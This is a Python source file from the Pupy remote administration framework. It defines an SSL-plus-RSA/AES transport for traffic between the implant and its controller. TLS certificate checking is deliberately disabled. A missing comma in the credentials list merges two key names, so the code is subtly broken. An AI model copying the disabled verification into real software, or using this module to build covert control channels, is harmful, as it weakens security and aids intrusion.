# -*- coding: utf-8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
import os
import tempfile
import ssl

from network.transports import Transport, LAUNCHER_TYPE_BIND
from network.lib import PupyTCPServer, PupySSLClient, PupySocketStream
from network.lib import RSA_AESClient, RSA_AESServer

# This doesn't make any sence, but who cares?

class DummySSLAuthenticator(object):
    def __init__(self, role, keystr, certstr, castr, server_side=False):
        self.keystr = keystr.strip()
        self.certstr = certstr.strip()
        self.castr = castr.strip()
        self.cert_reqs = ssl.CERT_NONE
        self.ssl_version = ssl.PROTOCOL_SSLv23
        self.ROLE = role
        self.server_side=server_side

    def __call__(self, sock):
        wrapped_socket = None
        tmp_cert_path = None
        tmp_key_path = None
        tmp_ca_path = None

        fd_cert_path, tmp_cert_path = tempfile.mkstemp()
        fd_key_path, tmp_key_path = tempfile.mkstemp()
        fd_ca_path, tmp_ca_path = tempfile.mkstemp()

        os.write(fd_cert_path, self.certstr)
        os.close(fd_cert_path)
        os.write(fd_key_path, self.keystr)
        os.close(fd_key_path)
        os.write(fd_ca_path, self.castr)
        os.close(fd_ca_path)

        try:
            wrapped_socket = ssl.wrap_socket(
                sock,
                keyfile=tmp_key_path,
                certfile=tmp_cert_path,
                ca_certs=tmp_ca_path,
                server_side=self.server_side,
                cert_reqs=self.cert_reqs,
                ssl_version=self.ssl_version
            )

        finally:
            os.unlink(tmp_cert_path)
            os.unlink(tmp_key_path)
            os.unlink(tmp_ca_path)

        peer = wrapped_socket.getpeercert()

        return wrapped_socket, peer


def ssl_authenticator():
    keystr = b''
    certstr = b''
    server_side = True

    try:
        import pupy_credentials
        assert(pupy_credentials)
        server_side = False

    except ImportError:
        from pupylib.PupyCredentials import Credentials

        credentials = Credentials()

        keystr = credentials['SSL_BIND_KEY']
        certstr = credentials['SSL_BIND_CERT']
        castr = credentials['SSL_CA_CERT']

        role = credentials.role

    return DummySSLAuthenticator(
        role, keystr, certstr, castr, server_side
    )


class TransportConf(Transport):
    info = "TCP transport wrapped with dummy SSL with an additional pupy's rsa layer"
    name = "ssl_rsa"

    server = PupyTCPServer
    client = PupySSLClient
    stream = PupySocketStream

    credentials = [
        'SSL_CA_CERT',
        'SSL_BIND_KEY', 'SSL_BIND_CERT',
        'SSL_CLIENT_KEY', 'SSL_CLIENT_CERT'
        'SIMPLE_RSA_PUB_KEY', 'SIMPLE_RSA_PRIV_KEY',
    ]

    def authenticator(self):
        return ssl_authenticator()

    def __init__(self, *args, **kwargs):
        Transport.__init__(self, *args, **kwargs)
        try:
            import pupy_credentials
            RSA_PUB_KEY = pupy_credentials.SIMPLE_RSA_PUB_KEY
            RSA_PRIV_KEY = pupy_credentials.SIMPLE_RSA_PRIV_KEY

        except ImportError:
            from pupylib.PupyCredentials import Credentials
            credentials = Credentials()
            RSA_PUB_KEY = credentials['SIMPLE_RSA_PUB_KEY']
            RSA_PRIV_KEY = credentials['SIMPLE_RSA_PRIV_KEY']

        if self.launcher_type == LAUNCHER_TYPE_BIND:
            self.client_transport = RSA_AESServer.custom(privkey=RSA_PRIV_KEY, rsa_key_size=4096, aes_size=256)
            self.server_transport = RSA_AESClient.custom(pubkey=RSA_PUB_KEY, rsa_key_size=4096, aes_size=256)
        else:
            self.client_transport = RSA_AESClient.custom(pubkey=RSA_PUB_KEY, rsa_key_size=4096, aes_size=256)
            self.server_transport = RSA_AESServer.custom(privkey=RSA_PRIV_KEY, rsa_key_size=4096, aes_size=256)
